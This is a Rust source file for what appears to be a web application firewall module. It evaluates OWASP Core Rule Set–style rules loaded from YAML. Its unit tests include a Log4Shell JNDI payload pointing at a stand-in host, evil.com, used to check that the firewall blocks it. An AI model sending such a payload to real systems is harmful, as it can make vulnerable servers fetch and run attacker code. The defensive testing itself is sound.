//! OWASP Core Rule Set (CRS) — native Rust implementation.
//!
//! Rules are loaded from `rules/owasp-crs.yaml` at build time (embedded)
//! and can optionally be overridden at runtime by a file on disk.
//!
//! Each rule has a `paranoia` level (1–4).  Only rules with
//! `paranoia <= host.defense_config.owasp_paranoia` are evaluated.
//! Default paranoia level is 1 (most permissive).

use std::path::Path;

use regex::Regex;
use serde::Deserialize;
use tracing::{debug, warn};

use waf_common::{DetectionResult, Phase, RequestCtx};

use super::Check;

// ── Embedded default rules ────────────────────────────────────────────────────

const DEFAULT_RULES_YAML: &str =
    include_str!("../../../../rules/owasp-crs.yaml");

// ── YAML schema ───────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct RuleSet {
    #[allow(dead_code)]
    version: String,
    #[allow(dead_code)]
    paranoia_level: u8,
    rules: Vec<YamlRule>,
}

#[derive(Debug, Deserialize)]
struct YamlRule {
    id: String,
    name: String,
    #[allow(dead_code)]
    category: String,
    #[allow(dead_code)]
    severity: String,
    paranoia: u8,
    field: String,
    operator: String,
    value: YamlValue,
    action: String,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum YamlValue {
    Str(String),
    List(Vec<String>),
    Int(i64),
}

// ── Compiled rule ─────────────────────────────────────────────────────────────

enum CompiledMatcher {
    Regex(Regex),
    Contains(String),
    NotIn(Vec<String>),
    Gt(i64),
    Lt(i64),
}

struct CompiledRule {
    id: String,
    name: String,
    paranoia: u8,
    field: String,
    matcher: CompiledMatcher,
    #[allow(dead_code)]
    action: String,
}

impl CompiledRule {
    fn matches(&self, ctx: &RequestCtx) -> bool {
        let field_val = self.get_field(ctx);

        match &self.matcher {
            CompiledMatcher::Regex(re) => {
                match self.field.as_str() {
                    "all" => {
                        // Check path, query, body
                        let body = String::from_utf8_lossy(&ctx.body_preview);
                        re.is_match(&ctx.path)
                            || re.is_match(&ctx.query)
                            || re.is_match(&body)
                            || ctx.headers.values().any(|v| re.is_match(v))
                    }
                    _ => field_val.as_ref().map(|v| re.is_match(v)).unwrap_or(false),
                }
            }
            CompiledMatcher::Contains(s) => {
                field_val.as_ref().map(|v| v.contains(s.as_str())).unwrap_or(false)
            }
            CompiledMatcher::NotIn(list) => {
                field_val
                    .as_ref()
                    .map(|v| !list.iter().any(|allowed| allowed.eq_ignore_ascii_case(v)))
                    .unwrap_or(false)
            }
            CompiledMatcher::Gt(n) => {
                field_val
                    .as_ref()
                    .and_then(|v| v.parse::<i64>().ok())
                    .map(|v| v > *n)
                    .unwrap_or(false)
            }
            CompiledMatcher::Lt(n) => {
                field_val
                    .as_ref()
                    .and_then(|v| v.parse::<i64>().ok())
                    .map(|v| v < *n)
                    .unwrap_or(false)
            }
        }
    }

    fn get_field<'a>(&self, ctx: &'a RequestCtx) -> Option<String> {
        match self.field.as_str() {
            "method" => Some(ctx.method.clone()),
            "path" => Some(ctx.path.clone()),
            "query" => Some(ctx.query.clone()),
            "content_length" => Some(ctx.content_length.to_string()),
            "content_type" => ctx.headers.get("content-type").cloned(),
            "user_agent" => ctx.headers.get("user-agent").cloned(),
            "body" => Some(String::from_utf8_lossy(&ctx.body_preview).into_owned()),
            "path_length" => Some(ctx.path.len().to_string()),
            "query_arg_count" => {
                let count = ctx.query.split('&').filter(|s| !s.is_empty()).count();
                Some(count.to_string())
            }
            _ => None,
        }
    }
}

// ── OWASPCheck ────────────────────────────────────────────────────────────────

/// WAF checker implementing a subset of the OWASP CRS.
pub struct OWASPCheck {
    rules: Vec<CompiledRule>,
}

impl OWASPCheck {
    /// Create with default embedded rules.
    pub fn new() -> Self {
        Self::from_yaml(DEFAULT_RULES_YAML)
    }

    /// Create from a YAML string.
    pub fn from_yaml(yaml: &str) -> Self {
        let ruleset: RuleSet = match serde_yaml::from_str(yaml) {
            Ok(r) => r,
            Err(e) => {
                warn!("Failed to parse OWASP rules YAML: {}", e);
                return Self { rules: vec![] };
            }
        };

        let rules = ruleset
            .rules
            .into_iter()
            .filter_map(|r| compile_rule(r))
            .collect();

        Self { rules }
    }

    /// Try to load rules from a file path, falling back to defaults on error.
    pub fn from_file_or_default(path: &Path) -> Self {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                debug!("Loading OWASP rules from {}", path.display());
                Self::from_yaml(&content)
            }
            Err(_) => {
                debug!("Using embedded OWASP rules");
                Self::new()
            }
        }
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

fn compile_rule(r: YamlRule) -> Option<CompiledRule> {
    let matcher = match r.operator.as_str() {
        "regex" => {
            let pattern = match &r.value {
                YamlValue::Str(s) => s.clone(),
                _ => return None,
            };
            match Regex::new(&pattern) {
                Ok(re) => CompiledMatcher::Regex(re),
                Err(e) => {
                    warn!("Invalid regex in OWASP rule {}: {}", r.id, e);
                    return None;
                }
            }
        }
        "contains" => {
            let s = match &r.value {
                YamlValue::Str(s) => s.clone(),
                _ => return None,
            };
            CompiledMatcher::Contains(s)
        }
        "not_in" => {
            let list = match &r.value {
                YamlValue::List(l) => l.clone(),
                _ => return None,
            };
            CompiledMatcher::NotIn(list)
        }
        "gt" => {
            let n = match &r.value {
                YamlValue::Int(n) => *n,
                _ => return None,
            };
            CompiledMatcher::Gt(n)
        }
        "lt" => {
            let n = match &r.value {
                YamlValue::Int(n) => *n,
                _ => return None,
            };
            CompiledMatcher::Lt(n)
        }
        op => {
            warn!("Unknown OWASP rule operator '{}' in rule {}", op, r.id);
            return None;
        }
    };

    Some(CompiledRule {
        id: r.id,
        name: r.name,
        paranoia: r.paranoia,
        field: r.field,
        matcher,
        action: r.action,
    })
}

impl Default for OWASPCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for OWASPCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.owasp_set {
            return None;
        }

        // Paranoia level from defense config (default 1)
        let paranoia = 1u8; // TODO: add paranoia_level to DefenseConfig

        for rule in &self.rules {
            if rule.paranoia > paranoia {
                continue;
            }
            if rule.matches(ctx) {
                return Some(DetectionResult {
                    rule_id: Some(rule.id.clone()),
                    rule_name: rule.name.clone(),
                    phase: Phase::Owasp,
                    detail: format!("OWASP rule {} triggered ({})", rule.id, rule.name),
                });
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use bytes::Bytes;
    use std::collections::HashMap;
    use waf_common::{DefenseConfig, HostConfig};

    fn make_ctx(method: &str, path: &str, content_length: u64) -> RequestCtx {
        let mut dc = DefenseConfig::default();
        dc.owasp_set = true;
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: method.into(),
            host: "example.com".into(),
            port: 80,
            path: path.into(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length,
            is_tls: false,
            host_config,
        }
    }

    #[test]
    fn test_invalid_method_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("FOOBAR", "/", 0);
        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
    }

    #[test]
    fn test_valid_method_allowed() {
        let checker = OWASPCheck::new();
        for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
            let ctx = make_ctx(method, "/", 0);
            assert!(
                checker.check(&ctx).is_none(),
                "{} should be allowed by OWASP method check",
                method
            );
        }
    }

    #[test]
    fn test_large_body_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
    }

    #[test]
    fn test_log4shell_blocked() {
        let checker = OWASPCheck::new();
        let mut ctx = make_ctx("GET", "/${jndi:ldap://evil.com/a}", 0);
        // put it in path
        ctx.path = "${jndi:ldap://evil.com/a}".into();
        assert!(checker.check(&ctx).is_some());
    }
}
